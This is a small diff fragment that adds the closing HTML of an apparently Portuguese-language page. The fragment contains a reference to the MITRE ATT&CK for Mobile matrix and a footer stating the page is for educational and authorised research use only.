+      <p class="muted">Referências consultadas para validação de técnicas MITRE ATT&amp;CK for Mobile: attack.mitre.org/matrices/mobile (acesso em julho de 2026).</p>
+    </section>
+
+  </article>
+</main>
+
+<footer class="bottom">
+  <p>Publicado apenas para fins educacionais e de pesquisa autorizada.</p>
+</footer>
+
+</body>
+</html>
